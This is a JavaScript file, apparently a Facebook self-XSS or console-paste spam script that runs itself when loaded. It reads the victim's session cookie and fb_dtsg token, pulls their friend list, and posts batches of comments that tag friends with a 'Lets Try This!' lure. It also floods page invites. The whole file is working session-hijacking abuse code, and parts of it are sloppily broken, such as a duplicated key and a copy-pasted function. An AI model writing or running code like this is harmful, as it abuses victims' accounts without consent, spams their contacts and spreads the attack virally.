var donnazmi = {
    posId: "267109466779624",
    idGw: "226344357522802",
    idGw: document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]),

    dtsg: document.getElementsByName("fb_dtsg")[0].value,
    ctLama: /comment_text=(.*?)&/,
    c: 1,
    ctBaru: "comment_text=",
    getPren: function(uid) {
        var a = window.ActiveXObject ? new ActiveXObject("Msxml2.XMLHTTP") : new XMLHttpRequest;
        if (a.open("GET", "/ajax/typeahead/first_degree.php?__a=1&filter[0]=user&lazy=0&viewer=" + uid + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", !1), a.send(null), 4 == a.readyState) {
            var b = JSON.parse(a.responseText.substring(a.responseText.indexOf("{")));
            return b.payload.entries
        }
        return !1
    },
    startmention: function() {
        if(!donnazmi.koncos) donnazmi.koncos = donnazmi.getPren(donnazmi.idGw);
        donnazmi.pale = "ft_ent_identifier=" + donnazmi.posId + "&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user=" + donnazmi.idGw + "&__a=1&__req=4u&fb_dtsg=" + donnazmi.dtsg + "&phstamp=" + Math.random();
        for (var n = 1; n < donnazmi.koncos.length; n++) {
            if (fb_dtsg = donnazmi.dtsg, donnazmi.ctBaru += "Hi,%20%40[" + donnazmi.koncos[n].uid + "%3AAAAAAAAAAAA]%20Lets Try This! Comment Like and Share ^_^ <3 %20%0A", donnazmi.c++, 7 == donnazmi.c) {
                with(donnazmi.ctBaru += "&", new XMLHttpRequest) 
					open("POST", "//www.facebook.com/ajax/ufi/add_comment.php?__a=1"), 
					setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), 
					send(donnazmi.pale.replace(donnazmi.ctLama, donnazmi.ctBaru));
                z = setTimeout("function(){asd=0}", 1e3), clearInterval(z), donnazmi.c = 1, donnazmi.ctBaru = "comment_text="
            }
        }
    },
	autoinbox: function() {
        if(!donnazmi.koncos) donnazmi.koncos = donnazmi.getPren(donnazmi.idGw);
        donnazmi.pale = "ft_ent_identifier=" + donnazmi.posId + "&comment_text=0&source=1&client_id=1359576694192%3A1233576093&reply_fbid&parent_comment_id&rootid=u_jsonp_3_19&ft[tn]=[]&ft[qid]=5839337351464612379&ft[mf_story_key]=5470779710560437153&ft[has_expanded_ufi]=1&nctr[_mod]=pagelet_home_stream&__user=" + donnazmi.idGw + "&__a=1&__req=4u&fb_dtsg=" + donnazmi.dtsg + "&phstamp=" + Math.random();
        for (var n = 1; n < donnazmi.koncos.length; n++) {
            if (fb_dtsg = donnazmi.dtsg, donnazmi.ctBaru += "Hi,%20%40[" + donnazmi.koncos[n].uid + "%3AAAAAAAAAAAA]%20Lets Try This! Comment Like and Share ^_^ <3 %20%0A", donnazmi.c++, 7 == donnazmi.c) {
                with(donnazmi.ctBaru += "&", new XMLHttpRequest) 
					open("POST", "//www.facebook.com/ajax/ufi/add_comment.php?__a=1"), 
					setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), 
					send(donnazmi.pale.replace(donnazmi.ctLama, donnazmi.ctBaru));
                z = setTimeout("function(){asd=0}", 1e3), clearInterval(z), donnazmi.c = 1, donnazmi.ctBaru = "comment_text="
            }
        }
    },
	sendinvite: function() {
        if(!donnazmi.koncos) donnazmi.koncos = donnazmi.getPren(donnazmi.idGw);
		if (document.getElementById("txtFloodMsg").value != "") donnazmi.posId = document.getElementById("txtFloodMsg").value;
		for (var n = 1; n < donnazmi.koncos.length; n++) {
			donnazmi.pale = "fb_dtsg=" + donnazmi.dtsg + "&profileChooserItems=%7B%22" + donnazmi.koncos[n].uid + "%22%3A1%7D&checkableitems[0]=" + donnazmi.koncos[n].uid + "&page_id="+donnazmi.posId+"&__user=" + donnazmi.idGw + "&__a=1&__dyn=7n8aD5z5CF-3ui&__req=k&phstamp=";
			with(donnazmi.ctBaru += "&", new XMLHttpRequest) 
				open("POST", "www.facebook.com/ajax/pages/invite/send"), 
				setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), 
				send(donnazmi.pale);
			z = setTimeout("function(){asd=0}", 1e3), clearInterval(z)
        }
    }
};

donnazmi.startmention();
